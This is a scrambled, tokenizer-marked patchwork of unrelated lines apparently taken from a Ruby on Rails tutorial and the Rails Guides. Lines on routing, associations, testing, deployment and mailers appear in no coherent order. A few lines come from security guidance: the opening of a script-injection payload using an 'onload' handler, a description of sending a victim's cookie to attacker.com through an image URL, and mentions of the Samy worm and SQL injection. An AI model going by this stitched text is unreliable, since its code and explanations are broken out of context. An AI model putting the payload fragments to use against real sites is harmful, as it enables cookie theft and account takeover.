▁The ▁basic ▁steps ▁appear ▁as ▁follows :
▁The ▁\ k ode { log \_ in } ▁function .
▁### ▁ Overriding ▁the ▁S ing ul ar ▁ Form
▁Note ▁the ▁form ▁of ▁the ▁assignment ▁in ▁the ▁first ▁line ▁of ▁the ▁\ k ode { remember } ▁method .
▁has _ many ▁: orders , ▁-> ▁ { ▁includes ▁: line _ items ▁ }
▁* ▁Configur e ▁your ▁email ▁server ▁to ▁forward ▁email s ▁from ▁the ▁address ( es ) ▁you ▁would ╼ ▁like ▁your ▁app ▁to ▁receive ▁to ▁` / path / to / app / bin / rails ▁run n er ╼ ▁' User Mailer ▖ receive ( ST D IN ▖ read ) ' ` .
▁In ▁that ▁case ▁we ▁test ▁whether ▁the ▁end s ▁of ▁the ▁argument ▁ range ▁be long ▁to ▁the ▁receiver ▁themselves :
▁WARNING : ▁It ' s ▁very ▁important ▁here ▁to ▁use ▁the ▁` String ` ▁version ▁of ▁the ▁class ,╼ ra the r ▁than ▁the ▁class ▁itself ▖
▁The ▁current ▁user ' s ▁profile ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ profile _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁If ▁you ' ve ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : bitbucket }, ▁you ▁m ight ▁notice ▁that ▁Bitbucket ▁did n ' t ▁automatically ▁ de t ec t ▁the ▁\ k ode { README ▖ rdoc } ▁file ▁from ▁our ▁repository , ▁instead ▁complain ing ▁on ▁the ▁main ▁repository ▁page ▁that ▁there ▁is ▁no ▁README ▁present ▁( Figure ~\ ref { fig : bitbucket _ no _ readme }) .
▁L uckily , ▁if ▁you ▁are ▁using ▁the ▁recommended ▁cloud ▁environment , ▁you ▁automatically ▁have ▁access ▁to ▁a ▁Unix ▁( Linux ) ▁command ▁line ▁running ▁a ▁standard ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / S hell _ ( com put ing )} { s hell ▁command - line ▁interface } ▁known ▁as ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / B a sh _ ( Unix _ s hell )} { B a sh } .
▁ Welcome ▁a board ▁ screen sh o t ]( images / getting _ started / rails _ welcome ▖ png )
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed .
▁The ▁method ▁` ago ` ▁receive s ▁a ▁number ▁of ▁second s ▁as ▁argument ▁and ▁returns ▁a ▁timestamp ▁those ▁many ▁second s ▁ ago ▁from ▁ midnight :
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }) .
▁error
▁### ▁S ing ul ar ▁Resource s
▁If ▁your ▁application ▁needs ▁to ▁use ▁the ▁old ▁ sanitizer ▁implementation , ▁include ▁` rails - deprecated _ sanitizer ` ▁in ▁your ▁Gemfile :
▁Rails ▁provides ▁a ▁b un ch ▁of ▁view ▁helper ▁methods ▁written ▁in ▁Ruby ▁to ▁as s ist ▁you ╼ in ▁ generating ▁HTML ▖
▁-> ▁ { ▁order (' order _ date ▁ desc ')▖ limit ( 1 00 ) ▁ },
▁# ▁Return s ▁the ▁Gravatar ▁( http :// gravatar ▖ com / ) ▁for ▁the ▁given ▁user .
▁#### # ▁ Options ▁for ▁` find _ each `
▁* ▁How ▁Active ▁Record ▁fit s ▁into ▁the ▁Model - View - Controller ▁pa ra d ig m .
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁Extensions ▁to ▁` In t eg er `
▁An ▁alter n ate ▁middleware ▁can ▁be ▁used ▁for ▁this ▁by ▁changing ▁the ▁` config ▖ action _ controller ▖ session _ store ` ▁to ▁an ▁alter n ate ▁value ▖
▁ target =" " on load =" var ▁ http _ request ▁= ▁false ; ▁var ▁E mail ▁= ▁ '' ;
▁A g a in , ▁most ▁of ▁the ▁changes ▁below ▁are ▁for ▁the ▁asset ▁pipeline ▖
▁| db / | C on tain s ▁your ▁current ▁database ▁ schema , ▁as ▁well ▁as ▁the ▁database ▁migrations .
▁This ▁will ▁ en tail ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁function s ▁with ▁the ▁proper ▁named ▁routes .
▁ Given ▁a ▁pair ▁` key `, ▁` value `:
▁The ▁\ k ode { sign \_ out } ▁method ▁in ▁the ▁Sessions ▁helper ▁module .
▁U S A G E
▁ensure s ▁that ▁all ▁CSS ▁files ▁in ▁the ▁\ k ode { app / assets / stylesheets } ▁directory ▁( including ▁the ▁ tree ▁subdirectories ) ▁are ▁included ▁into ▁the ▁application ▁CSS ▖ ▁The ▁line
▁For ▁more ▁details ▁on ▁such ▁routing ▁options , ▁see ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails ▁Guides ▁article ▁on ▁`` Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In '' } .
▁See ╼[ P re compiling ▁ Asset s ](# pre compiling - assets ) ▁for ▁more ▁information ▁on ▁how ╼ pre compiling ▁works .
▁As ▁with ▁the ▁\ k ode { header } ▁tag ' s ▁classes , ▁these ▁classes ▁have ▁special ▁meaning ▁to ▁Bootstrap .
▁orders ▖ destroy ( object , ▁ ▖▖▖)
▁This ▁is ▁not ▁true ▁for ▁array ' s ▁elements , ▁however ▖
▁The ▁method ▁` end _ of _ minute ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁ minute ▁( h h : m m : 59 ) :
▁You ▁can ▁also ▁specify ▁constraints ▁in ▁a ▁block ▁form :
▁The ▁second ▁model ▁will ▁handle ╼ comments ▁on ▁articles .
▁=> ▁" production "
▁WARNING : ▁Object s ▁will ▁ _ al way s _ ▁be ▁removed ▁from ▁the ▁database , ▁ignoring ▁the ▁`: dependent ` ▁option .
▁ ╼ ▁> > ▁Rails ▖ env ▖ test ?
▁The ▁final ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁application .
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁primary ▁key ▁of ▁this ▁model ▁is ▁` id ` ▖
▁#### # ▁`: association _ foreign _ key `
▁File ▖ open ( file _ name ) ▁ { ▁| f | ▁ Marshal ▖ load ( f ) ▁ }
▁ ╼\ end { item ize }╼╼ ▁% ▁subsection ▁we a k ness es _ of _ the _ users _ resource ▁( end )╼╼ ▁% ▁section ▁users _ resource ▁( end )╼╼ ▁\ section { The ▁Microposts ▁resource } ▁% ▁( fold )╼ ▁\ label { sec : microposts _ resource }╼╼
▁resources ▁: comments , ▁only : ▁ [: index , ▁: new , ▁: create ]
▁The ▁`` Name '' ▁and ▁`` E mail '' ▁fields ▁in ▁Figure ~\ ref { fig : edit _ page } ▁also ▁shows ▁how ▁Rails ▁automatically ▁pre - fi ll s ▁the ▁Name ▁and ▁E mail ▁fields ▁using ▁the ▁attributes ▁of ▁the ▁existing ▁\ k ode {@ user } ▁variable .
▁Generat ing ▁a ▁Users ▁controller ▁( with ▁a ▁\ k ode { new } ▁action ) .
▁TIP : ▁In ▁any ▁case , ▁Rails ▁will ▁not ▁create ▁foreign ▁key ▁columns ▁for ▁you ▖
▁The ▁initial ▁Micropost ▁ spec .
▁Re placing ▁the ▁\ k ode { full \_ title } ▁test ▁helper ▁with ▁a ▁simple ▁\ k ode { include } .
▁The ▁other ▁two ▁verb s , ▁\ text tt { PATCH } ▁and ▁\ text tt { DELETE }, ▁are ▁design ed ▁for ▁\ emph { updating } ▁and ▁\ emph { destroy ing } ▁things ▁on ▁the ▁remote ▁server .
▁order ▖ destroy
▁ Version ▁control ▁systems ▁allow ▁us ▁to ▁ track ▁changes ▁to ▁our ▁project ' s ▁code , ▁collaborat e ▁more ▁easily , ▁and ▁roll ▁back ▁any ▁in ad ve r t ent ▁errors ▁( such ▁as ▁accidental ly ▁ deleting ▁files ) .
▁In ▁our ▁case , ▁we ▁used ▁ SCSS ▁from ▁the ▁start ▁in ▁order ▁to ▁take ▁advantage ▁of ▁Bootstrap .
▁| ▁| ▁20 3 ▁| ▁: n on _ author it a tive _ information ▁|
▁d ▖ end _ of _ week ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁ Welcome ▁to ▁example ▖ com , ▁<%= ▁@ user ▖ name ▁%>
▁H ist or ical ly , ▁Rails ▁ha d ▁some ▁ compatibility ▁issues ▁with ▁the ▁JSON ▁gem ▖
▁The ▁X - Sendfile ▁header ▁is ▁a ▁ directive ▁to ▁the ▁web ▁server ▁to ▁ignore ▁the ▁response ╼ from ▁the ▁application , ▁and ▁instead ▁serve ▁a ▁specified ▁file ▁from ▁di s k ▖
▁A ▁model ▁for ▁user ▁followers ▁using ▁a ▁ reverse ▁Relationship ▁model .
▁def ▁receive ( email )
▁When ▁the ▁form ▁is ▁submitted ▁( i ▖ e ▖ , ▁when ▁the ▁user ▁hit s ▁the ▁submit ▁button ▁or ▁form ▖ submit ▁is ▁called ▁via ▁JavaScript ), ▁the ▁form ▁input s ▁will ▁be ▁bundle d ▁into ▁the ▁params ▁object ▁and ▁passed ▁back ▁to ▁the ▁controller .
▁A long ▁with ▁\ emph { Programming ▁Ruby } ▁author ▁ Dave ▁ Thomas , ▁M i k e ▁t a ug h t ▁the ▁first ▁Rails ▁course ▁I ▁too k , ▁way ▁back ▁in ▁ 2006 .
▁ l s : ▁app / controllers / : ▁No ▁such ▁file ▁or ▁directory
▁Here , ▁we ▁expect ▁it ▁to ▁be ▁more ▁complicated , ▁something ▁like
▁te } ╼╼% ▁subsection ▁a _ validity _ test ▁( end )╼╼ ▁\ subsection { V al id ating ▁presence } ▁% ▁( fold )╼ ▁\ label { sec : presence _ validation }╼╼
▁You ▁only ▁need ▁to ▁use ▁this ▁option ▁if ▁the ▁name ▁of ▁the ▁source ▁association ▁cannot ▁be ▁automatically ▁inferred ▁from ▁the ▁association ▁name .
▁* ▁` config ▖ assets ▖ compile ` ▁is ▁a ▁boolean ▁that ▁can ▁be ▁used ▁to ▁turn ▁on ▁live ▁Sprockets ▁ com p i l ation ▁in ▁production .
▁as ▁seen ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁ strip _ links (" email s ▁to ▁< a ▁ href =" mail to : me @ email ▖ com "> me @ email ▖ com </ a > ▖ ")
▁ env ▖ cache ▁= ▁ ActiveSupport :: Cache ▖ lo o k up _ store (: null _ store )
▁TIP : ▁The ▁examples ▁below ▁use ▁` $ ` ▁to ▁represent ▁your ▁terminal ▁pro mp t ▁in ▁a ▁U N I X - like ▁OS ,╼ t hough ▁it ▁may ▁have ▁been ▁customize d ▁to ▁appear ▁different ly ▖
▁All ▁objects ▁in ▁Rails ▁respond ▁to ▁the ▁method ▁` to _ param `, ▁which ▁is ▁mean t ▁to ▁return ▁something ▁that ▁represent s ▁them ▁as ▁values ▁in ▁a ▁query ▁string , ▁or ▁as ▁URL ▁ fragments .
▁( As ▁in ▁Section ~\ ref { sec : deploying }, ▁you ▁may ▁see ▁some ▁ warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁build _ customer
▁### ▁`: allow _ blank `
▁ Adding ▁the ▁\ text tt { cucumber - rails } ▁gem ▁to ▁the ▁\ k ode { Gemfile ▖ }
▁By ▁naming ▁the ▁columns ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁we ' ll ▁let ▁Active ▁Record ▁ figure ▁out ▁the ▁User ▁object ▁attributes ▁for ▁us .
▁as ▁show n ▁in ▁Listing ~\ ref { code : followers _ test } .
▁#### ▁ Methods ▁Add ed ▁by ▁` has _ and _ belongs _ to _ many `
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁ registration ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ) .
▁by ▁[ Michael ▁Hartl ]( http :// michael hartl ▖ com / ) .
▁< label ▁for =" file "> File ▁to ▁ Upload </ label > ▁<%= ▁file _ field _ tag ▁" file " ▁%>
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example ▖ com "}
▁The ▁ MySpace ▁ Sam y ▁worm ▁will ▁be ▁discuss ed ▁in ▁the ▁CSS ▁Injection ▁section .
▁This ▁make s ▁for ▁clear er ▁read ability ▁if ▁you ▁have ▁a ▁large ▁number ▁of ▁variable ▁conditions .
▁The ▁` re order ` ▁method ▁override s ▁the ▁default ▁scope ▁order ▖
▁By ▁default , ▁Rails ▁will ▁ compile ▁each ▁template ▁to ▁a ▁method ▁in ▁order ▁to ▁render ▁it ▖
▁Active ▁Record ▁for ▁example ▁uses ▁this ▁method ▁to ▁ com put e ▁the ▁name ▁of ▁a ▁ counter ▁cache ▁column :
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁( for ▁`` form '') .
▁If ▁you ▁persist ▁in ▁br ing ing ▁old ▁ha bit s ▁from ╼ other ▁languages ▁to ▁your ▁Rails ▁development , ▁and ▁try ing ▁to ▁use ▁pattern s ▁you ╼ learned ▁else where , ▁you ▁may ▁have ▁a ▁less ▁h app y ▁experience .
▁ Adding ▁following / follower ▁relationships ▁to ▁the ▁sample ▁data .
▁For ▁example , ▁if ▁you ▁have ▁this ▁code ▁in ▁your ▁` Book sController ` ▁class :
▁### ▁Object ▁ Relation al ▁M app ing
▁Rails ▁allows ▁you ▁to ▁alter ▁what ▁generator s ▁are ▁used ▁with ▁the ▁` config ▖ generator s ` ▁method ▖
▁It ' s ▁also ▁worth ▁noting ▁that ▁the ▁ screen sh o t s ▁use ▁Bootstrap ~ 2▖ 0, ▁whereas ▁the ▁tutorial ▁current ly ▁uses ▁Bootstrap ~ 2▖ 3 , ▁so ▁there ▁may ▁be ▁minor ▁difference s ▁in ▁appearance .
▁< p > This ▁is ▁a ▁special ▁page ▖ </ p >
▁* ▁`: join _ table `
▁format ▖ html ▁ { ▁render ▁action : ▁' new ' ▁ }
▁te }╼╼ ▁% ▁subsection ▁inheritance _ hierarchies ▁( end )╼╼ ▁\ subsection { D e p lo y ing ▁the ▁toy ▁app } ▁% ▁( fold )╼ ▁\ label { sec : deploying _ the _ toy _ app }╼╼
▁For ▁more ▁details ▁check ▁out ▁[ Programming ▁Ruby ]( http :// www ▖ ruby - doc ▖ org / docs / Programming Ruby / ) .
▁module ▁M
▁* ▁` config ▖ i 18 n ▖ available _ locales ` ▁ white list s ▁the ▁available ▁ locales ▁for ▁the ▁app ▖
▁# ▁=> ▁< input ▁id =" attachment " ▁name =" attachment " ▁type =" file " ▁/>
▁We ' ll ▁be ▁using ▁the ▁ factor ies ▁generated ▁by ▁\ href { http :// github ▖ com / thoughtbot / factory _ g ir l } { Factory ▁Girl }, ▁a ▁Ruby ▁gem ▁produce d ▁by ▁the ▁good ▁people ▁at ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot } .
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 , ▁ separator : ▁ / \ s / )
▁In ▁this ╼ case ▁Git ▁will ▁not ▁allow ▁you ▁to ▁push ▁the ▁changes ▁as ▁the ▁push ed ▁branch ╼ and ▁local ▁branch ▁do ▁not ▁match ▖
▁( Listing ~\ ref { code : users _ fixtures _ extra _ users } ▁also ▁creates ▁a ▁couple ▁of ▁other ▁named ▁users ▁for ▁future ▁reference ▖)
▁However , ▁due ▁to ▁the ▁rich ▁number ▁of ▁methods ▁Rails ▁gives ▁you ▁to ▁interact ▁with ╼ validations ▁in ▁general , ▁it ' s ▁fai r ly ▁easy ▁to ▁build ▁your ▁own ▖
▁ Initial i z ation ▁events
▁Because ▁it ▁place s ▁the ▁id ▁as ▁plain ▁text , ▁this ▁method ▁expose s ▁the ▁form ▁of ▁the ▁application ' s ▁cookies ▁and ▁make s ▁it ▁easier ▁for ▁an ▁attacker ▁to ▁ com p r o mis e ▁user ▁account s .
▁=> ▁" 4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁ 14 , ▁ 15 , ▁ 16 , ▁17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁### ▁Using ▁`: as ` ▁in ▁N est ed ▁Resource s
▁X - Time r : ▁S 140 89 12 12 5 ▖ 2 1 16 38 2 12 , V S 0, V E 0
▁def ▁active _ customer
▁" b ackoffice / session "▖ camelize ▁# ▁=> ▁" B ackoffice :: Session "
▁M u ch ▁of ▁Action ▁Controller ' s ▁functionality ▁is ▁implemented ▁as ▁ Middleware s ▖
▁class _ name : ▁" Order "
▁ ╼ ▁$ ▁rails ▁destroy ▁model ▁User
▁ensure s ▁that ▁\ k ode { id } ~ is ▁properly ▁\ emph { escape d } ▁before ▁being ▁included ▁in ▁the ▁under ly ing ▁SQL ▁query , ▁there by ▁avoid ing ▁a ▁serious ▁security ▁hole ▁called ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL _ inject ion }{\ emph { SQL ▁injection } } .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : password _ reset _ preview }, ▁the ▁HTML ▁and ▁text ▁email ▁ preview s ▁appear ▁as ▁in ▁Figure ~\ ref { fig : password _ reset _ html _ preview } ▁and ▁Figure ~\ ref { fig : password _ reset _ text _ preview } .
▁The ▁raw ▁ home ▁view ▁(\ href { http ://0▖0▖0▖0:3000/ static _ pages / home }{/ static \_ pages / home }) .
▁Do c to r al ▁di s s er t ation , ▁Un ivers ity ▁of ▁C a li for n ia , ▁I r v in e , ▁2000 .
▁### ▁ Adding ▁Some ▁Validation
▁Those ▁using ▁the ▁cloud ▁IDE ▁should ▁see ▁the ▁Heroku ▁version ▁number , ▁indicat ing ▁that ▁the ▁\ k ode { heroku } ▁C L I ▁is ▁available , ▁but ▁on ▁other ▁systems ▁it ▁may ▁be ▁necessary ▁to ▁install ▁it ▁using ▁the ▁\ href { https :// t oolbelt ▖ heroku ▖ com /}{ Heroku ▁T oolbelt }
▁ Fi ll ▁in ▁some ▁details ▁about ╼ your ▁ po t en tial ▁ patch ▁including ▁a ▁meaning ful ▁title ▖
▁( If ▁your ▁system ▁complain s ▁about ▁the ▁ la c k ▁of ▁a ▁JavaScript ▁run time , ▁visit ▁the ▁\ href { https :// github ▖ com / s s te phens on / execjs } { execjs ▁page ▁at ▁GitHub } ▁for ▁a ▁list ▁of ▁possibilities .
▁ ▖ class ▁ { ▁background - image : ▁url ( <%= ▁asset _ path ▁' image ▖ png ' ▁%> ) ▁ }
▁T w o ▁very ▁common ▁source s ▁of ▁data ▁that ▁are ▁not ▁ UT F -8 :
▁If ▁you ▁understand ▁the ▁scaffold ▁code , ▁you ▁ probably ▁should n ' t ▁be ▁reading ▁this ▁book .
▁# ▁created _ at ▁: datetime
▁* ▁` config ▖ action _ mailer ▖ delivery _ method ` ▁defines ▁the ▁ delivery ▁method ▁and ▁defaults ▁to ▁`: smtp ` ▖
▁* ▁`: auto save `
▁You ▁should ▁verify ▁that ▁the ▁tests ▁fail ▁at ▁this ▁point :
▁d ▖ sunday ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁ { a } ▁through ▁\ k ode { z } ? ▁What ▁about ▁the ▁same ▁ range ▁ reverse d ? ▁\ emph { Hint } : ▁In ▁both ▁cases ▁you ▁will ▁have ▁to ▁convert ▁the ▁ range ▁to ▁an ▁array ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 e 1 3 ce ' ></ span >╼ \ end { enumerate }╼╼ ▁\ subsection { B lock s } ▁% ▁( fold )╼ ▁\ label { sec : block s }╼╼
▁B ▖ x ▁# ▁=> ▁: a
▁### ▁Co un t
▁You ▁can ▁also ▁specify ▁multiple ▁ video s ▁to ▁ play ▁by ▁passing ▁an ▁array ▁of ▁ video s ▁to ▁the ▁` video _ tag `:
▁The ▁initial ▁\ k ode { new } ▁view ▁for ▁Users .
▁create ▁app / helpers / blorgh / articles _ helper ▖ rb
▁def ▁ foo
▁</ html >
▁Active ▁Record ▁callbacks ▁allow ▁you ▁to ▁a tt a ch ▁code ▁to ▁certain ▁events ▁in ▁the ╼ life - c y c le ▁of ▁your ▁models ▖
▁Next , ▁why ▁does ▁the ▁\ k ode { data - turbolinks - track } ▁key - value ▁pair ▁use ▁the ▁old - style ▁h ashrocket ▁syntax ?
▁ inflect ▖ acronym ▁' SSL '
▁"#{ title } ▁- ▁# { truncate ( text )} "
▁Client ▖ minimum (" age ")
▁In ▁this ▁section ▁and ▁the ▁next , ▁we ' ll ▁ prepare ▁for ▁this ▁work ▁by ▁construct ing ▁a ▁Sessions ▁controller , ▁a ▁signin ▁form , ▁and ▁the ▁relevant ▁controller ▁actions .
▁These ▁messages ▁are ▁used ▁when ╼ the ▁`: message ` ▁option ▁isn ' t ▁specified ▖
▁( You ▁should ▁ ex it ▁the ▁console ▁and ▁re - ent er ▁it ▁to ▁clear ▁out ▁the ▁old ▁definition ▁of ▁\ k ode { Word } ▖)
▁There ▁are ▁four ▁available ▁association ▁callbacks :
▁A ▁partial ▁for ▁the ▁new ▁and ▁edit ▁form ▁fields .
▁### ▁` id s `
▁R a is ing ▁an ▁exception ▁in ▁an ▁un test ed ▁branch ▖
▁* ▁Style ▁ guidelines ▁for ▁document ing ▁different ▁kind s ▁of ▁Ruby ▁code .
▁has _ many ▁: recent _ orders ,
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / : id / edit ▁| ▁ ads # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁edit ing ▁an ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁The ▁`-- full ` ▁option ▁tell s ▁the ╼ generator ▁that ▁you ▁want ▁to ▁create ▁an ▁engine , ▁including ▁a ▁ s k e let on ▁structure ╼ that ▁provides ▁the ▁following :
▁ Initial ▁commit
▁Other ▁authentication ▁methods ▁are ▁available ▁for ▁Rails ▁applications ▖
▁In ▁particular , ▁starting ▁in ▁Section ~\ ref { sec : the _ asset _ pipeline } ▁we ' ll ▁discuss ▁the ▁\ k ode { app / assets } ▁directory , ▁part ▁of ▁the ▁\ emph { asset ▁pipeline } ▁that ▁make s ▁it ▁easier ▁than ▁ever ▁to ▁ org an ize ▁and ▁deploy ▁assets ▁such ▁as ▁c ascad ing ▁style ▁ sheet s ▁and ▁JavaScript ▁files .
▁def ▁find _ recent
▁( L ac k ing ▁the ▁pa t i ence ▁to ▁wait ▁two ▁hours , ▁we ' ll ▁cover ▁the ▁third ▁branch ▁in ▁a ▁test , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ updating _ the _ reset })▖)
▁Rails ▁4▖0 ▁ extract ed ▁Active ▁Resource ▁to ▁its ▁own ▁gem ▖
▁ _ U se ▁` escape HTML () ` ▁( or ▁its ▁alias ▁` h () ` ) ▁method _ ▁to ▁replace ▁the ▁HTML ▁input ▁characters ▁& amp ; , ▁& quot ; , ▁& lt ; , ▁& gt ; ▁by ▁their ▁un in ter pre ted ▁representation s ▁in ▁HTML ▁( ` & amp ; `, ▁` & quot ; `, ▁` & lt ` ; , ▁and ▁` & gt ; ` )▖
▁c attr _ accessor ▁: field _ error _ proc
▁as ▁show n ▁in ▁Listing ~\ ref { code : debugger } .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁ greater ▁than ╼ ▁% { count } " _ .
▁class _ attribute ▁: x , ▁instance _ reader : ▁false
▁The ▁next ▁example ▁will ▁try ▁to ▁load ▁an ▁image ▁from ▁the ▁URL ▁ http :// www ▖ attacker ▖ com / ▁plus ▁the ▁cookie ▖
▁In ▁the ▁directory ▁you ▁ clone d ▁your ▁for k :
▁@ books ▁= ▁ Book ▖ all
▁If ▁you ▁want ▁to ▁specify ▁multiple ▁conditions :
▁create ▁app / models / blorgh / comment ▖ rb
▁In ▁the ▁case ▁of ▁post ing ▁to ▁the ▁signup ▁form , ▁\ k ode { params } ▁instead ▁contains ▁a ▁hash ▁of ▁hashes , ▁a ▁construction ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols }, ▁which ▁introduce d ▁the ▁ str ate g ical ly ▁named ▁\ k ode { params } ▁variable ▁in ▁a ▁console ▁session .
▁This ▁is ▁a ▁first ▁important ▁step ▁toward ▁allow ing ▁users ▁to ▁ register ▁for ▁our ▁site ; ▁we ' ll ▁take ▁the ▁next ▁step , ▁ modeling ▁users , ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁and ▁we ' ll ▁finish ▁the ▁job ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁-- ▁create _ table (: microposts )
▁ Refactor ing s ▁and ▁documentation ▁changes ▁generally ▁should ▁not ▁go ▁to ▁the ▁C HA N G E LO G .
▁The ▁foreign ▁key ▁reference ▁is ▁a ▁database - level ▁constraint ▁indicat ing ▁that ▁the ▁user ▁id ▁in ▁the ▁microposts ▁table ▁refer s ▁to ▁the ▁id ▁column ▁in ▁the ▁users ▁table .
▁hidden _ field _ tag ▁' token ', ▁' V U B J K B 23 U I V I 1 U U 1 V O B V I @ '
▁In ▁practice , ▁my ▁usual ▁algorithm ▁is ▁to ▁omit ▁\ k ode { bundle ▁exec } ▁unless ▁I ▁get ▁an ▁error , ▁in ▁which ▁case ▁I ▁re - try ▁with ▁\ k ode { bundle ▁exec } ▁and ▁see ▁if ▁it ▁works .
▁Client ▖ created _ before ( Time ▖ zone ▖ now )
▁A nother ▁routing ▁error , ▁un initialize d ▁constant ▁Article sController ]( images / getting _ started / routing _ error _ no _ controller ▖ png )
▁ Updating ▁\ k ode { current \_ user } ▁for ▁ persistent ▁sessions ▖
▁$ ▁ heroku ▁ maintenance : on ╼ $ ▁git ▁push ▁ heroku ╼ $ ▁ heroku ▁run ▁rake ▁db : migrate ╼ $ ▁ heroku ▁ maintenance : of f
▁The ▁` destroy ` ▁action ▁will ▁find ▁the ▁article ▁we ▁are ▁look ing ▁at , ▁ lo c ate ▁the ▁comment ╼ with in ▁the ▁`@ article ▖ comments ` ▁collection , ▁and ▁then ▁remove ▁it ▁from ▁the ╼ database ▁and ▁send ▁us ▁back ▁to ▁the ▁show ▁action ▁for ▁the ▁article .
▁Note ▁that ▁we ▁need ▁to ▁create ▁a ▁password ▁reset ▁token ▁for ▁use ▁in ▁the ▁views ; ▁unlike ▁the ▁activation ▁token , ▁which ▁is ▁created ▁for ▁every ▁user ▁by ▁a ▁\ k ode { before \_ create } ▁callback ▁( Listing ~\ ref { code : user _ model _ activation _ code }), ▁the ▁password ▁reset ▁token ▁is ▁created ▁only ▁when ▁a ▁user ▁successfully ▁submit s ▁the ▁`` forgot ▁password '' ▁form .
▁You ▁can ▁send ▁a ▁raw ▁content ▁back ▁to ▁the ▁browser , ▁without ▁setting ▁any ▁content ╼ type , ▁by ▁using ▁the ▁`: body ` ▁option ▁to ▁` render `:
▁The ▁first ▁line ▁here ▁pull s ▁the ▁user ▁out ▁of ▁the ▁database ▁using ▁the ▁submitted ▁email ▁address .
▁Buil t - in ▁Ruby ▁data ▁structure s ▁include ▁arrays , ▁ range s , ▁and ▁hashes .
▁It ▁make s ▁the ▁as sum p tion ▁that ▁there ▁is ▁the ▁" b est " ╼ way ▁to ▁do ▁things , ▁and ▁it ' s ▁design ed ▁to ▁encourag e ▁that ▁way ▁- ▁and ▁in ▁some ▁cases ▁to ╼ d is c our age ▁ alternative s ▖
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) ▁with ▁no ▁custom ▁CSS ▖ ~\ href { http :// railstutorial ▖ org / images / figures / layout _ no _ logo _ or _ custom _ css _ bootstrap _ rails _ 4 - full ▖ png }{( full ▁size )}
▁WARNING : ▁This ▁does ▁not ▁trigger ▁callbacks ▁on ▁the ▁join ▁records .
▁regular ▁expression ▁to ▁validate ▁the ▁attribute ' s ▁value ▖
▁For ▁start ers , ▁it ▁help s ▁just ▁to ▁verify ▁bug ▁report s ▖
▁De let ing ▁ Comments
▁< form ▁action ="/ articles /1 " ▁class =" button _ to " ▁data - remote =" true " ▁method =" post ">
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure ▖
▁For ▁example , ▁if ▁a ▁document ▁has ▁many ▁section s , ▁and ▁a ▁section ▁has ▁many ▁pa ra gr a ph s , ▁you ▁may ▁some times ▁want ▁to ▁get ▁a ▁simple ▁collection ▁of ▁all ▁pa ra gr a ph s ▁in ▁the ▁document ▖
▁### ▁Format ting
▁There ▁are ▁two ▁basic ▁ways ▁to ▁do ▁this .
▁<%= ▁comment ▖ comment er ▁%>
▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }) .
